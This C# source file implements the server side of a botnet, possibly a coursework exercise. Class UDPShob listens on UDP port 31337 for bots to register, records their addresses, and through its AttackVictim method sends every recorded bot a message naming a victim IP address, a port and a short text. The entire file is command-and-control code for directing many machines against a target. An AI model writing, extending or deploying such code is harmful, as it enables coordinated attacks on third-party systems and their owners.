using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Shob
{
    class UDPShob
    {
        Controller controller;
        string ShobName = "Krang";
        int ShobPort = 31337;
        UdpClient udpServer;
        Dictionary<int,Tuple<IPAddress, int>> MyBots;
        public UDPShob()
        {
            MyBots = new Dictionary<int, Tuple<IPAddress,int>>();
        }
        internal void SetController(Controller mcontroller)
        {
            controller = mcontroller;
        }

        internal void StartServer()
        {
            
                udpServer = new UdpClient(ShobPort);
                Thread t = new Thread(ListenToBots);
                t.Start();
            
        }

        private void ListenToBots()
        {
            var counter = 0;
            while (true)
            {
                var remoteEP = new IPEndPoint(IPAddress.Any, ShobPort);
                var data = udpServer.Receive(ref remoteEP);
                int i = data[0] + (data[1] * 256);
                Tuple<IPAddress, int> myWeirdTuple;
                myWeirdTuple = Tuple.Create(remoteEP.Address,i);
                MyBots.Add(counter, myWeirdTuple);
                counter++;  
            }
        }

        internal void AttackVictim(byte[] iPAddress, byte[] port, byte[] text)
        {
            
            byte[] msg = CreateAttackingMessage(iPAddress, port, text);
            foreach (KeyValuePair<int,Tuple<IPAddress, int>> entry in MyBots)
            {
                var remoteEP = new IPEndPoint(entry.Value.Item1, entry.Value.Item2);
                udpServer.Send(msg, msg.Length, remoteEP); 
            }


        }

        private byte[] CreateAttackingMessage(byte[] iPAddress, byte[] port, byte[] text)
        {
            byte[] msg = new byte[44];
            byte[] name = Encoding.UTF8.GetBytes(ShobName);
            int i = 0;
            for (i = 0; i < 4; i++)
                msg[i] = iPAddress[i];
            for (i = 4; i < 6; i++)
                msg[i] = port[i-4];
            for (i=6;i<12;i++)
                if (i-6 < text.Length)
                    msg[i] = text[i-6];
            for (i=12;i< name.Length+12;i++)
            {
                msg[i] = name[i - 12];
            }
            return msg;
        }
    }
}
